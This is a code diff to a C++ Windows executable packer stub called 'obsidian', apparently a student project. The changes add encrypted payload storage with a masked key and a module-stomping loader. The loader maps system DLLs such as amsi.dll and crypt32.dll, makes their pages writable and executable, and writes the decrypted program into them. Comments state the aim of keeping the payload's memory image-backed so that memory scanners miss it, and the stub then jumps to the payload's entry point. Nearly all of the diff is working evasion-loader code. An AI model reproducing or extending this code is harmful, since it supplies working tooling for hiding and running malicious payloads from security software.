@@ -6,13 +6,15 @@
 /*   By: marvin <marvin@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/10/23 02:08:58 by marvin            #+#    #+#             */
-/*   Updated: 2026/10/23 23:29:15 by marvin           ###   ########.fr       */
+/*   Updated: 2026/10/24 04:03:55 by marvin           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "obsidian.hpp"
 #include "compression/compression.hpp"
+#include "crypto/crypto.hpp"
 #include "file/file.hpp"
+#include "loader/restore.hpp"
 #include "pe/pe.hpp"
 
 #include <windows.h>
@@ -22,6 +24,15 @@
 #include <cstring>
 #include <iostream>
 #include <string>
+
+volatile unsigned char obsidian_key_slot[OBSIDIAN_KEY_SLOT_SIZE] =
+{
+	'O', 'B', 'S', 'I', 'D', 'I', 'A', 'N', '_', 'K', 'E', 'Y', 'S', 'L', 'O', 'T',
+	0, 0, 0, 0, 0, 0, 0, 0,
+	0, 0, 0, 0, 0, 0, 0, 0,
+	0, 0, 0, 0, 0, 0, 0, 0,
+	0, 0, 0, 0, 0, 0, 0, 0
+};
 
 uintptr_t get_original_entry_point(char *obsram, uint32_t obsram_size, PEInfo &info)
 {
@@ -99,27 +110,63 @@ HANDLE	open_self(LARGE_INTEGER &self_size)
 	return (self_file);
 }
 
+static_assert(sizeof(OBSIDIAN_KEY_MARKER) - 1 == OBSIDIAN_KEY_MARKER_SIZE, "key marker size mismatch");
+
 // Footer: marker, compressed size, original size.
-bool	read_footer(HANDLE self_file, LARGE_INTEGER self_size, uint64_t &compressed_size, uint64_t &original_size)
+struct PackedFooter
+{
+	uint8_t		version;
+	uint8_t		compression_id;
+	uint8_t		encryption_id;
+	uint8_t		nonce_size;
+	unsigned char	nonce[OBSD_NONCE_MAX];
+	uint64_t	stored_size;
+	uint64_t	original_size;
+	uint8_t		restore_mode;
+};
+
+bool	read_footer(HANDLE self_file, LARGE_INTEGER self_size, PackedFooter &footer)
 {
 	LARGE_INTEGER	footer_offset;
-	char			footer[OBSD_FOOTER_SIZE];
+	char			raw[OBSD_FOOTER_SIZE];
 	DWORD			read_size;
+	int			index;
 
 	if (self_size.QuadPart < OBSD_FOOTER_SIZE)
 		return (false);
 	footer_offset.QuadPart = self_size.QuadPart - OBSD_FOOTER_SIZE;
 	if (!SetFilePointerEx(self_file, footer_offset, NULL, FILE_BEGIN))
 		return (false);
-	if (!ReadFile(self_file, footer, sizeof(footer), &read_size, NULL))
+	if (!ReadFile(self_file, raw, sizeof(raw), &read_size, NULL))
 		return (false);
-	if (read_size != sizeof(footer))
+	if (read_size != sizeof(raw))
 		return (false);
-	if (footer[0] != OBSD[0] || footer[1] != OBSD[1] || footer[2] != OBSD[2] || footer[3] != OBSD[3])
+	if (raw[0] != OBSD[0] || raw[1] != OBSD[1] || raw[2] != OBSD[2] || raw[3] != OBSD[3])
 		return (false);
-	compressed_size = read_uint64_le(footer + 4);
-	original_size = read_uint64_le(footer + 12);
-	if (compressed_size > static_cast<uint64_t>(self_size.QuadPart - OBSD_FOOTER_SIZE))
+	footer.version = static_cast<uint8_t>(raw[OBSD_OFFSET_VERSION]);
+	if (footer.version != OBSD_VERSION)
+		return (false);
+	footer.compression_id = static_cast<uint8_t>(raw[OBSD_OFFSET_COMPRESSION]);
+	footer.encryption_id = static_cast<uint8_t>(raw[OBSD_OFFSET_ENCRYPTION]);
+	footer.nonce_size = static_cast<uint8_t>(raw[OBSD_OFFSET_NONCE_SIZE]);
+	if (footer.nonce_size > OBSD_NONCE_MAX)
+		return (false);
+	index = 0;
+	while (index < OBSD_NONCE_MAX)
+	{
+		footer.nonce[index] = 0;
+		index++;
+	}
+	index = 0;
+	while (index < footer.nonce_size)
+	{
+		footer.nonce[index] = static_cast<unsigned char>(raw[OBSD_OFFSET_NONCE + index]);
+		index++;
+	}
+	footer.stored_size = read_uint64_le(raw + OBSD_OFFSET_STORED_SIZE);
+	footer.original_size = read_uint64_le(raw + OBSD_OFFSET_ORIGINAL_SIZE);
+	footer.restore_mode = static_cast<uint8_t>(raw[OBSD_OFFSET_RESTORE]);
+	if (footer.stored_size > static_cast<uint64_t>(self_size.QuadPart - OBSD_FOOTER_SIZE))
 		return (false);
 	return (true);
 }
@@ -152,6 +199,195 @@ bool	read_payload(HANDLE self_file, LARGE_INTEGER self_size, uint64_t compressed
 		remaining -= read_size;
 		position += read_size;
 	}
+	return (true);
+}
+
+/*
+** Recovers the original payload: the key is unmasked with the nonce read back
+** from the footer, the stored blob is decrypted in place, then the footer's
+** compression identifier selects the backend that restores the image.
+*/
+bool	recover_payload(std::string &stored, PackedFooter &footer, std::string &payload)
+{
+	const crypto::Algorithm		*encryption;
+	const compression::Algorithm	*codec;
+	unsigned char			key[OBSIDIAN_KEY_SIZE];
+	int				index;
+
+	codec = compression::get(footer.compression_id);
+	if (codec == NULL)
+	{
+		std::cout << "obsidian: unknown compression id\n";
+		return (false);
+	}
+	encryption = crypto::get(footer.encryption_id);
+	if (encryption == NULL)
+	{
+		std::cout << "obsidian: unknown encryption id\n";
+		return (false);
+	}
+	if (footer.nonce_size != encryption->nonce_size)
+	{
+		std::cout << "obsidian: nonce size mismatch for " << encryption->name << "\n";
+		return (false);
+	}
+	index = 0;
+	while (index < OBSIDIAN_KEY_SIZE)
+	{
+		key[index] = obsidian_key_slot[OBSIDIAN_KEY_MARKER_SIZE + index];
+		index++;
+	}
+	encryption->mask(key, footer.nonce);
+	if (!encryption->decrypt(stored, key, footer.nonce))
+		return (false);
+	return (codec->decompress(stored, footer.original_size, payload));
+}
+
+/*
+** Module stomping. A legitimate system module is loaded as an image and the
+** restored sections are written into it, so the memory that holds the payload
+** stays backed by a file on disk instead of a private anonymous allocation.
+*/
+const char *const	g_stomp_candidates[] =
+{
+	"dbghelp.dll",
+	"amsi.dll",
+	"wintrust.dll",
+	"msi.dll",
+	"wldap32.dll",
+	"winhttp.dll",
+	"version.dll",
+	"crypt32.dll"
+};
+
+const size_t	g_stomp_candidate_count = sizeof(g_stomp_candidates) / sizeof(g_stomp_candidates[0]);
+
+std::string	path_basename(std::string path)
+{
+	size_t	separator;
+
+	separator = path.find_last_of("\\/");
+	if (separator == std::string::npos)
+		return (path);
+	return (path.substr(separator + 1));
+}
+
+bool	name_matches(std::string left, std::string right)
+{
+	size_t	index;
+	int	a;
+	int	b;
+
+	if (left.size() != right.size())
+		return (false);
+	index = 0;
+	while (index < left.size())
+	{
+		a = left[index];
+		b = right[index];
+		if (a >= 'A' && a <= 'Z')
+			a = a - 'A' + 'a';
+		if (b >= 'A' && b <= 'Z')
+			b = b - 'A' + 'a';
+		if (a != b)
+			return (false);
+		index++;
+	}
+	return (true);
+}
+
+bool	list_contains(std::vector<std::string> &names, std::string wanted)
+{
+	size_t	index;
+
+	index = 0;
+	while (index < names.size())
+	{
+		if (name_matches(path_basename(names[index]), wanted))
+			return (true);
+		index++;
+	}
+	return (false);
+}
+
+// Reads SizeOfImage out of a mapped image header.
+bool	image_size_of(char *base, uint32_t &size)
+{
+	char	*nt_headers;
+
+	size = 0;
+	if (base[0] != 'M' || base[1] != 'Z')
+		return (false);
+	nt_headers = base + read_uint32_le(base + 0x3C);
+	if (nt_headers[0] != 'P' || nt_headers[1] != 'E')
+		return (false);
+	size = read_uint32_le(nt_headers + 24 + 56);
+	return (size != 0);
+}
+
+bool	acquire_image_region(std::string &payload, PEInfo &info, char *&region, uint32_t &region_size)
+{
+	std::vector<std::string>	imported;
+	std::vector<ImportSymbol>	symbols;
+	char				system_dir[MAX_PATH];
+	std::string			path;
+	std::string			base_name;
+	uint32_t			module_size;
+	size_t				index;
+	size_t				found;
+	HMODULE				module;
+	DWORD				previous;
+
+	region = NULL;
+	region_size = 0;
+	if (GetSystemDirectoryA(system_dir, MAX_PATH) == 0)
+		return (false);
+	// Best effort: without the import list no candidate can be filtered out.
+	read_import_dlls(payload, info, imported, symbols);
+	index = 0;
+	found = 0;
+	while (index < g_stomp_candidate_count)
+	{
+		base_name = g_stomp_candidates[index];
+		if (list_contains(imported, base_name)
+			|| GetModuleHandleA(base_name.c_str()) != NULL)
+		{
+			index++;
+			continue ;
+		}
+		path = std::string(system_dir) + "\\" + base_name;
+		module = LoadLibraryExA(path.c_str(), NULL, DONT_RESOLVE_DLL_REFERENCES);
+		if (module == NULL)
+		{
+			index++;
+			continue ;
+		}
+		region = reinterpret_cast<char *>(module);
+		if (!image_size_of(region, module_size)
+			|| module_size < info.optional.size_of_image)
+		{
+			index++;
+			continue ;
+		}
+		// The mapped pages are read-only or read-write. Writing into them
+		// copies them privately while the image backing is kept.
+		if (!VirtualProtect(region, module_size, PAGE_EXECUTE_READWRITE, &previous))
+		{
+			index++;
+			continue ;
+		}
+		region_size = module_size;
+		found = index + 1;
+		break ;
+	}
+	if (found == 0)
+	{
+		region = NULL;
+		region_size = 0;
+		return (false);
+	}
+	std::cout << "obsidian: restore region from " << g_stomp_candidates[found - 1]
+		<< " (" << region_size << " bytes)\n";
 	return (true);
 }
 
@@ -202,16 +438,13 @@ bool	restore_sections(std::string &payload, PEInfo &info, char *obsram, uint32_t
 
 	if (obsram_size < info.optional.size_of_image)
 		return (false);
-	if (info.optional.size_of_headers > payload.size()
-		|| info.optional.size_of_headers > obsram_size)
-		return (false);
-	std::copy_n(payload.data(), info.optional.size_of_headers, obsram);
 	i = 0;
 	while (i < info.sections.size())
 	{
 		SectionInfo	&section = info.sections[i];
 		size_t	copy_size;
 		size_t	virtual_size;
+		size_t	available;
 
 		copy_size = section.raw_size;
 		virtual_size = section.virtual_size;
@@ -221,12 +454,19 @@ bool	restore_sections(std::string &payload, PEInfo &info, char *obsram, uint32_t
 			copy_size = virtual_size;
 		if (section.virtual_address > obsram_size)
 			return (false);
-		if (copy_size > obsram_size - section.virtual_address)
-			return (false);
+		available = obsram_size - section.virtual_address;
+		if (virtual_size > available)
+			virtual_size = available;
+		if (copy_size > virtual_size)
+			copy_size = virtual_size;
 		if (section.raw_offset > payload.size())
 			return (false);
 		if (copy_size > payload.size() - section.raw_offset)
 			return (false);
+		// The region comes from a mapped module, so the uninitialized tail of
+		// every section has to be cleared explicitly.
+		if (virtual_size != 0)
+			std::memset(obsram + section.virtual_address, 0, virtual_size);
 		if (copy_size != 0)
 			std::copy_n(payload.data() + section.raw_offset, copy_size,
 				obsram + section.virtual_address);
@@ -592,10 +832,20 @@ bool	protect_sections(std::string &payload, PEInfo &info, char *obsram, uint32_t
 	std::vector<DWORD>	pages;
 	size_t	page_count;
 	size_t	i;
+	DWORD	whole_previous;
 
 	(void)payload;
 	page_count = (obsram_size + 4095ULL) / 4096ULL;
 	pages.assign(page_count, 0);
+	// The region arrives writable and executable from the stomp step. Drop
+	// the execute right first, so pages that no section covers end up
+	// read-write instead of staying executable.
+	if (!VirtualProtect(obsram, obsram_size, PAGE_READWRITE, &whole_previous))
+	{
+		std::cout << "obsidian: VirtualProtect failed on the restore region"
+			<< " (error " << GetLastError() << ")\n";
+		return (false);
+	}
 	i = 0;
 	while (i < info.sections.size())
 	{
@@ -770,15 +1020,14 @@ bool	prepare_tls(std::string &payload, PEInfo &info, char *obsram,
 	char	**new_array;
 	TEB_MINI	*teb;
 
-	(void)payload;
 	callbacks = 0;
 	tls_ready = true;
 	optional_offset = static_cast<size_t>(info.dos.e_lfanew) + 24;
-	directory_count = read_uint32_le(obsram + optional_offset + 108);
+	directory_count = read_uint32_le(payload.data() + optional_offset + 108);
 	if (directory_count <= 9)
 		return (true);
-	tls_rva = read_uint32_le(obsram + optional_offset + 184);
-	tls_size = read_uint32_le(obsram + optional_offset + 188);
+	tls_rva = read_uint32_le(payload.data() + optional_offset + 184);
+	tls_size = read_uint32_le(payload.data() + optional_offset + 188);
 	if (tls_rva == 0 && tls_size == 0)
 		return (true);
 	if (tls_rva == 0 || tls_size == 0)
@@ -967,7 +1216,6 @@ bool	validate_restored_image(std::string &payload, PEInfo &info, char *obsram,
 	uint32_t	import_size;
 	uint32_t	pdata_rva;
 	uint32_t	pdata_size;
-	uint32_t	e_lfanew;
 	size_t	resolved_dlls;
 	size_t	resolved_funcs;
 	size_t	unwind_count;
@@ -975,23 +1223,17 @@ bool	validate_restored_image(std::string &payload, PEInfo &info, char *obsram,
 	std::string	readiness;
 
 	structure_ok = true;
-	if (obsram[0] != 'M' || obsram[1] != 'Z')
 	{
-		std::cout << "obsidian: validation failed, MZ signature missing in .obsram\n";
-		structure_ok = false;
-	}
-	e_lfanew = read_uint32_le(obsram + 0x3C);
-	if (obsram[e_lfanew] != 'P' || obsram[e_lfanew + 1] != 'E')
-	{
-		std::cout << "obsidian: validation failed, PE signature missing in .obsram\n";
-		structure_ok = false;
-	}
-	if (info.optional.size_of_headers > payload.size()
-		|| info.optional.size_of_headers > obsram_size
-		|| std::memcmp(payload.data(), obsram, info.optional.size_of_headers) != 0)
-	{
-		std::cout << "obsidian: validation failed, restored headers differ from the file\n";
-		structure_ok = false;
+		MEMORY_BASIC_INFORMATION	region_info;
+
+		// The restore region must stay part of a mapped image. A private
+		// anonymous allocation is what memory scanners look for.
+		if (VirtualQuery(obsram, &region_info, sizeof(region_info)) == 0
+			|| region_info.Type != MEM_IMAGE)
+		{
+			std::cout << "obsidian: validation failed, restore region is not image backed\n";
+			structure_ok = false;
+		}
 	}
 	if (static_cast<uint64_t>(info.optional.entry_point_rva) + 16 > info.optional.size_of_image
 		|| static_cast<uint64_t>(info.optional.entry_point_rva) + 16 > obsram_size)
@@ -1042,12 +1284,12 @@ bool	validate_restored_image(std::string &payload, PEInfo &info, char *obsram,
 		}
 	}
 	optional_offset = static_cast<size_t>(info.dos.e_lfanew) + 24;
-	reloc_rva = read_uint32_le(obsram + optional_offset + 152);
-	reloc_size = read_uint32_le(obsram + optional_offset + 156);
-	import_rva = read_uint32_le(obsram + optional_offset + 120);
-	import_size = read_uint32_le(obsram + optional_offset + 124);
-	pdata_rva = read_uint32_le(obsram + optional_offset + 136);
-	pdata_size = read_uint32_le(obsram + optional_offset + 140);
+	reloc_rva = read_uint32_le(payload.data() + optional_offset + 152);
+	reloc_size = read_uint32_le(payload.data() + optional_offset + 156);
+	import_rva = read_uint32_le(payload.data() + optional_offset + 120);
+	import_size = read_uint32_le(payload.data() + optional_offset + 124);
+	pdata_rva = read_uint32_le(payload.data() + optional_offset + 136);
+	pdata_size = read_uint32_le(payload.data() + optional_offset + 140);
 	if (reloc_rva != 0 && reloc_size != 0 && patched_relocs == 0)
 	{
 		std::cout << "obsidian: validation failed, relocations present but none patched\n";
@@ -1141,14 +1383,14 @@ bool	validate_restored_image(std::string &payload, PEInfo &info, char *obsram,
 		validity = "valid";
 	else
 		validity = "INVALID";
-	uint32_t	directory_count2 = read_uint32_le(obsram + optional_offset + 108);
+	uint32_t	directory_count2 = read_uint32_le(payload.data() + optional_offset + 108);
 	if (directory_count2 > 9)
 	{
 		uint32_t	tls_rva;
 		uint32_t	tls_size;
 
-		tls_rva = read_uint32_le(obsram + optional_offset + 184);
-		tls_size = read_uint32_le(obsram + optional_offset + 188);
+		tls_rva = read_uint32_le(payload.data() + optional_offset + 184);
+		tls_size = read_uint32_le(payload.data() + optional_offset + 188);
 		if (tls_rva != 0 && tls_size != 0)
 		{
 			uint64_t	start_va;
@@ -1205,7 +1447,7 @@ bool	validate_restored_image(std::string &payload, PEInfo &info, char *obsram,
 	return (structure_ok);
 }
 // Call original TLS callbacks before the entry point.
-bool	run_tls_callbacks(PEInfo &info, char *obsram, uint32_t obsram_size)
+bool	run_tls_callbacks(std::string &payload, PEInfo &info, char *obsram, uint32_t obsram_size)
 {
 	size_t	optional_offset;
 	uint32_t	tls_rva;
@@ -1215,10 +1457,10 @@ bool	run_tls_callbacks(PEInfo &info, char *obsram, uint32_t obsram_size)
 	size_t	index;
 
 	optional_offset = static_cast<size_t>(info.dos.e_lfanew) + 24;
-	if (read_uint32_le(obsram + optional_offset + 108) <= 9)
+	if (read_uint32_le(payload.data() + optional_offset + 108) <= 9)
 		return (true);
-	tls_rva = read_uint32_le(obsram + optional_offset + 184);
-	tls_size = read_uint32_le(obsram + optional_offset + 188);
+	tls_rva = read_uint32_le(payload.data() + optional_offset + 184);
+	tls_size = read_uint32_le(payload.data() + optional_offset + 188);
 	if (tls_rva == 0 && tls_size == 0)
 		return (true);
 	if (tls_rva == 0 || tls_size == 0)
@@ -1269,13 +1511,13 @@ bool	run_tls_callbacks(PEInfo &info, char *obsram, uint32_t obsram_size)
 	return (true);
 }
 
-bool	launch_original(char *obsram, uint32_t obsram_size, PEInfo &info)
+bool	launch_original(std::string &payload, char *obsram, uint32_t obsram_size, PEInfo &info)
 {
 	typedef	int (*entry_fn)(void);
 	entry_fn	fn;
 	int	return_code;
 
-	if (!run_tls_callbacks(info, obsram, obsram_size))
+	if (!run_tls_callbacks(payload, info, obsram, obsram_size))
 		return (false);
 	std::cout.flush();
 	fn = reinterpret_cast<entry_fn>(get_original_entry_point(obsram, obsram_size, info));
@@ -1286,11 +1528,10 @@ int	main(void)
 {
 	LARGE_INTEGER	self_size;
 	HANDLE			self_file;
-	std::string	compressed;
+	std::string	stored;
 	std::string	payload;
+	PackedFooter	footer;
 	PEInfo	info;
-	uint64_t	compressed_size;
-	uint64_t	original_size;
 	char	*obsram;
 	uint32_t	obsram_size;
 	size_t	patched_relocs;
@@ -1303,26 +1544,47 @@ int	main(void)
 	self_file = open_self(self_size);
 	if (self_file == INVALID_HANDLE_VALUE)
 		return (1);
-	if (!read_footer(self_file, self_size, compressed_size, original_size))
+	if (!read_footer(self_file, self_size, footer))
 	{
 		CloseHandle(self_file);
 		return (1);
 	}
-	if (!read_payload(self_file, self_size, compressed_size, compressed))
+	if (!read_payload(self_file, self_size, footer.stored_size, stored))
 	{
 		CloseHandle(self_file);
 		return (1);
 	}
 	if (!CloseHandle(self_file))
 		return (1);
-	if (!compression::decompress(compressed, original_size, payload))
+	if (!recover_payload(stored, footer, payload))
 		return (1);
 
 	if (!fill_pe_info(payload, info))
 		return (1);
 
-	if (!find_obsram(obsram, obsram_size))
+	if (footer.restore_mode == RESTORE_STOMP)
+	{
+		if (!acquire_image_region(payload, info, obsram, obsram_size))
+		{
+			std::cout << "obsidian: stomp region unavailable, falling back to .obsram\n";
+			if (!find_obsram(obsram, obsram_size))
+				return (1);
+		}
+	}
+	else if (footer.restore_mode == RESTORE_OBSRAM)
+	{
+		if (!find_obsram(obsram, obsram_size))
+		{
+			std::cout << "obsidian: .obsram section missing, falling back to stomp\n";
+			if (!acquire_image_region(payload, info, obsram, obsram_size))
+				return (1);
+		}
+	}
+	else
+	{
+		std::cout << "obsidian: unknown restore mode " << static_cast<int>(footer.restore_mode) << "\n";
 		return (1);
+	}
 
 	if (!restore_sections(payload, info, obsram, obsram_size))
 		return (1);
@@ -1352,7 +1614,7 @@ int	main(void)
 		patched_relocs, tls_ready, delay_dlls))
 		return (1);
 
-	if (!launch_original(obsram, obsram_size, info))
+	if (!launch_original(payload, obsram, obsram_size, info))
 		return (1);
 	return (0);
 }
